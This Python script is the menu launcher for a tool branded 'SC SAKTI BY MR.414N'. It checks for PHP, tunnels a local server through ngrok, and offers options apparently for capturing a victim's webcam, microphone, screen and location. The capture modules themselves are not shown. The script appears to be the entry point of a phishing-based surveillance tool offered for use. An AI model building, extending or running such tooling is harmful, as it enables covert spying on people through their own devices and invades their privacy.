import os
import sys
import platform
import pip
from subprocess import getoutput
from modules import banner
from modules import localhost



if platform.uname()[0] == "Windows":
    print("\n SC SAKTI BY MR.414N \n")
    exit()
else:
    pass


check_php = getoutput("php -v")
if "not found" in check_php:
    exit("HARAP install php \n command > apt install php")

try:
    from colorama import Fore 
    import requests
    from pyngrok import ngrok
    
except ImportError:
    print("please install library \n command > python3 -m pip install -r requirments.txt")


while True:
    banner.banner()
    banner.infolist0()
    

    try:

        input1 = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+" SC SAKTI BY MR.414N"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"> ")
        
        if input1 == "1":
            localhost.webcham()
        
        elif input1 == "2":
            banner.banner()   
            localhost.micro()
        
        elif input1 == "3":
            banner.banner()
            localhost.screen()

        

        elif input1 == "4":
            banner.banner()
            localhost.location()
        
        elif input1 == "5":
            banner.banner()
            banner.Settings()

        elif input1 == "6":
            print("\n THANKS BRO ")
            sys.exit()

        
            



    except KeyboardInterrupt:
        print("")
        sys.exit()